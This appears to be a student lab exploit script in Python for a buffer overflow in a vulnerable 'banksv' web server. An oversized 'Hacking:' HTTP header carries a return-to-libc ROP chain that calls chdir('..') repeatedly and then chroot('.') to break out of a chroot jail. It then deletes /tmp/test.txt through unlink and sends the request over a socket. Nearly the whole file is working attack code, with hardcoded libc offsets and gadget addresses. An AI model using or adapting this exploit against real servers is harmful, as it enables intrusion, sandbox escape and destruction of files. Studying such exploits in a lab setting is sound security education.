#!/usr/bin/python3
import sys
import socket
import traceback
import struct
import time
import os.path
import binascii
from pwn import *

# libc base address
# ASLR should be off, so that libc's base address will not change untill next reboot .
## sudo gdb -p pid
## info proc mapping
base_addr = 0xf7da8000  # banksv

# All of the offsets of functions (strings) inside libc won't change much (sometimes changed, so check is needed).
# To get the offset of a funtion:
##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep "system"
# To get the offset of string "/bin/sh":
##  ropper --file /lib/i386-linux-gnu/libc.so.6 --string "/bin/sh"
system_addr = base_addr + 0x00044d00
sh_str_addr = base_addr + 0x0018fb62
exit_addr   = base_addr + 0x00037680
unlink_addr = base_addr + 0x000f3f60
remove_addr = base_addr + 0x00054d10
chdir_addr  = base_addr + 0x000f2ba0
chroot_addr = base_addr + 0x000fd810
puts_addr   = base_addr + 0x0006f4e0
pop5_ret_addr = 0x0805c480
pop4_ret_addr = pop5_ret_addr + 1
pop3_ret_addr = pop4_ret_addr + 1
pop2_ret_addr = pop3_ret_addr + 1
pop1_ret_addr = pop2_ret_addr + 1


# ebp too make the task simple, we print ebp of getToken function (vulnerable) 
ebp_addr = 0xffffd1f8

## Below is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the vulnerable web server and exploit it.

def build_exploit(shellcode):
    
    # All of the header information other than "Content-Length" is not important
    req  = ("POST / HTTP/1.1\r\n").encode('latin-1')
    req += ("Host: 127.0.0.1\r\n").encode('latin-1')
    # The Content-Length below is useful, and depends on the length of username + password, 
    ##  you need to use wireshark (together with web browser) for checking the length.
    req += ("Content-Length: 64\r\n").encode('latin-1')
    req += ("Origin: http://127.0.0.1\r\n").encode('latin-1')
    req += ("Connection: keep-alive\r\n").encode('latin-1')
    req += ("Referer: http://127.0.0.1/\r\n").encode('latin-1')

    # For different oses (and compilation), the length of fillup for 
    # hijacking the return address in the stack, could be different,
    # therefore you need to debug the program for checking and adjusting.
    req += ("Hacking: ").encode('latin-1')

    req += b'XBA' * 356

    chdir_times = 7
    chdir_arg = "..\0\0"
    for i in range(1, chdir_times + 1, 1):
        req += p32(chdir_addr)
        req += p32(pop2_ret_addr)
        req += p32(ebp_addr + 16 * i)
        req += chdir_arg.encode('latin-1')

    chroot_arg = ".\0\0\0"
    req += p32(chroot_addr)
    req += p32(pop2_ret_addr)
    req += p32(ebp_addr + 16 * chdir_times + 16)
    req += chroot_arg.encode('latin-1')

    unlink_arg = "/tmp/test.txt\0\0\0"
    req += p32(unlink_addr)
    req += p32(exit_addr)
    req += p32(ebp_addr + 16 * chdir_times + 16 + 20)
    req += p32(0)
    req += unlink_arg.encode('latin-1')
    
    # The end of header line "Hacking: xxxxx".
    req += ("\r\n").encode('latin-1')

    # The blank line between headers and body.
    req += ("\r\n").encode('latin-1')
   
    # Below is the username/password that you can Register into the web server
    # by using web browser. These information will be stored into the sqlite db behind.
    # You need to change these information according to your own registration.
 
    # Note that successful POST will be responded by the server with a hint page.
    # By using the successful response, you can judge whether the server has been 
    # crashed (by exploit), so that you can adjust the fillup accordingly.
    req += ("login_username=xubiang&login_password=xubiang&submit_login=Login").encode('latin-1')

    # print(req)
    return req


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ("").encode("latin-1")
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp


if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellcode = ""
    if(os.path.exists("shellcode.bin")):
        shellfile = open("shellcode.bin", "r")
        shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:", req)
    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:", resp)
except:
    print("Exception:", traceback.format_exc())
